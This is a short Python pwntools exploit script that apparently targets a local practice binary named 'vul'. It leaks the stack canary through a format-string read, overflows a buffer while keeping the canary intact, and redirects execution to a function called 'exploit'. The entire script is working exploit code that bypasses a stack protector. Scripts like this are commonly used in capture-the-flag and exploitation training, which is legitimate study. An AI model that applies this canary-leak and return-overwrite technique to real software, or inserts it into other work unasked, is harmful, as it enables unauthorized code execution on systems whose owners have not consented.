#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
p = process('./vul')
elf = ELF('./vul')
exploit_addr = elf.symbols['exploit']
gdb.attach(p)
payload1 = '%15$08x'
p.sendline(payload1)
canary = int(p.recv(8), 16)
log.success('canary = ' + hex(canary))
payload2 = flat([
	'AAAA' * 8, 
	canary, 
	'AAAA' * 3, 
	exploit_addr
])
# payload2 = flat([canary for i in range(20)])
p.sendline(payload2)
p.interactive()
